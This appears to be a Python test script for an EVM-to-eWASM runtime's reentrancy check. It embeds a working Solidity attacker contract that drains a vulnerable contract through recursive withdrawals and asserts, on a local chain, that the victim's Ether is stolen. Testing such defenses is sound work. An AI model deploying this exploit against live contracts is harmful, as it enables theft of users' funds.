# author cswmchen
# date   15-11-21
# python -m runtimeTest.reentrancy --overwrite --langArgs="--check-reentrancy"

import os
import json
from utils import cmdLine, runRPC, deploy_contract, activate_contract, prtInfo, prtDeug, compile_source_file, evm2ewasm

expAgentSol = '''
contract ReEntrancy {
    mapping(address => uint256) public balances;
    function depositFunds() public payable;
    function withdrawFunds (uint256 _weiToWithdraw) public;
 }

contract Attack {
  ReEntrancy public instance;
    address public _at;

  // intialise the etherStore variable with the contract address
  constructor(address _instanceAddr) {
      instance = ReEntrancy(_instanceAddr);
      _at = _instanceAddr;
  }
  
    function balanceOf(address account) view public returns (uint256) {
            return instance.balances(account);
    }
    function pay() public payable {
        require(msg.value >= 1 ether);
    }
    function deposit() public payable {
      instance.depositFunds.value(1 ether)();
    }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      instance.depositFunds.value(1 ether)();
      instance.withdrawFunds(1 ether);
  }
  
  function collectEther() public {
      msg.sender.transfer(this.balance);
  }
    
  function () payable {
      if (instance.balance >= 1 ether) {
          instance.withdrawFunds(1 ether);
      }
  }
}
'''

def transferEther(w3, _from, _to, _value):
    _tx_hash = w3.eth.sendTransaction({'from':_from, 'to': _to, 'value': _value}) 
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

def main():
    args = cmdLine()
    w3 = runRPC()
    solPath = "./contracts/reentrance.sol"
    if w3.eth.get_balance(w3.eth.accounts[1]) <  w3.toWei(2, 'ether'):
        transferEther(w3, w3.eth.accounts[0], w3.eth.accounts[1], w3.toWei(2, 'ether'))
   

    # _tx_hash = w3.eth.sendTransaction({'from':w3.eth.accounts[0], 'to': w3.eth.accounts[1], 'value': w3.toWei(2, 'ether')}) 
    # _ = w3.eth.wait_for_transaction_receipt(_tx_hash)
    # prtDeug(f"Balance[1]@={w3.eth.get_balance(w3.eth.accounts[1])}")


    metadataPath = solPath[:-4] + '.json'
    if os.path.exists(metadataPath) and not args.overwrite:
        with open(metadataPath, 'r') as f:
            obj = json.load(f)
            victimAddr = obj['addr']
            contractABI = obj['abi']
    else:
        cmrt = compile_source_file(solPath, version='0.4.25')
        contractHex = cmrt['bin']#'0x'+cmrt['bin'] if cmrt['bin'][:2] != '0x' else cmrt['bin']
        contractABI =  cmrt['abi']
        # contractEwasm = contractHex 
        contractEwasm = evm2ewasm(contractHex, args)
        victimAddr = deploy_contract(w3, w3.eth.accounts[0], contractABI, contractEwasm)

        with open(metadataPath, 'w') as f:
            json.dump({'abi':contractABI, 'hex':contractHex, 'bin': contractEwasm , 'addr':victimAddr}, f)

    # with open('./t.wasm', 'wb') as f:
    #     f.write(w3.eth.getCode(victimAddr))

    # init victim 
    victim = activate_contract(w3, victimAddr, contractABI)
    # print(victim.functions.balances(w3.eth.accounts[0]).call())
    # exit()
    # ================================ accounts[0] deposited 2 Ether ======================================
    if victim.functions.balances(w3.eth.accounts[0]).call() < w3.toWei(2, 'ether'):
        _tx_hash = victim.functions.depositFunds().transact({'from':w3.eth.accounts[0], 'value': w3.toWei(4, 'ether'), 'gas':100000}) 
        _ = w3.eth.wait_for_transaction_receipt(_tx_hash)
        
        # measure gas used in withdraw()
        _tx_hash = victim.functions.withdrawFunds(w3.toWei(1, 'ether')).transact({'from':w3.eth.accounts[0], 'gas':100000}) 
        _receipt = w3.eth.wait_for_transaction_receipt(_tx_hash)
        prtInfo(f"[-] Used gas = {_receipt['gasUsed']} wei")

    if True:
        # test withdrawFunds(); PASSED
        prtDeug(f"Deposit[acct0]={victim.functions.balances(w3.eth.accounts[0]).call()/1e18} Ether")
        prtDeug(f"Total Balance of victim={w3.eth.get_balance(victimAddr)}")
        _tx_hash = victim.functions.withdrawFunds(w3.toWei(1, 'ether')).transact({'from':w3.eth.accounts[0]}) 
        w3.eth.wait_for_transaction_receipt(_tx_hash)
        prtDeug(f"Deposit[acct0]={victim.functions.balances(w3.eth.accounts[0]).call()/1e18} Ether")

    # prtInfo(f"\n=========================== virtual transactions ================================")    
    # prtDeug(f"Balance[1]@={w3.eth.get_balance(w3.eth.accounts[1])}")
    # prtDeug(f"Balance[victim]@={w3.eth.get_balance(victimAddr)}")

    # prtDeug(f"Deposit[victim]={victim.functions.balances(w3.eth.accounts[0]).call()/1e18} Ether")

    # w3.eth.sendTransaction({'from':w3.eth.accounts[0], 'to': w3.eth.accounts[1], 'value': 1000}) 
    # exit()
    # compile atkAgent
    with open('.tmp.sol', 'w') as f:
        f.write(expAgentSol)
    cmrt = compile_source_file('.tmp.sol', version='0.4.26')
    # deploy atkAgent
    atkAgentAddr = deploy_contract(w3, w3.eth.accounts[1], cmrt['abi'], cmrt['bin'], victimAddr)
    atkAgent = activate_contract(w3, atkAgentAddr, cmrt['abi'])
    prtDeug(f"Balance[1]@={w3.eth.get_balance(w3.eth.accounts[1])/1e18} Ether")

    if False:
        _tx_hash = atkAgent.functions.deposit().transact({'from':w3.eth.accounts[0], 'value': w3.toWei(1, 'ether')}) 
        w3.eth.wait_for_transaction_receipt(_tx_hash)
        prtDeug(f"atkAgent Deposit={victim.functions.balances(atkAgentAddr).call()}")
        # exit()

    prtInfo(f"=========================== initial states ================================")   
    # prtDeug(f"Balance[atkAgent]={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")
    prtDeug(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    prtDeug(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")

    prtInfo(f"\nattacking...")   
    _tx_hash = atkAgent.functions.pwnEtherStore().transact({'from':w3.eth.accounts[1], 'value': w3.toWei(1, 'ether'), 'gas':300000000}) 
    _ = w3.eth.wait_for_transaction_receipt(_tx_hash)

    # print("@@ atkAgent Deposit", victim.functions.balances(atkAgentAddr).call())
    # print("@@ atkAgent Deposit", victim.functions.balances(atkAgentAddr).call())
    
    prtInfo(f"=========================== exploited ================================")    
    prtDeug(f"Balance@victim={w3.eth.get_balance(victimAddr)/1e18} Ether")
    prtDeug(f"Balance@atkAgent={w3.eth.get_balance(atkAgentAddr)/1e18} Ether")
    
    assert w3.eth.get_balance(victimAddr) == 0, "Fail to steal Ether from the victim"
    prtInfo("PASSED")
main()


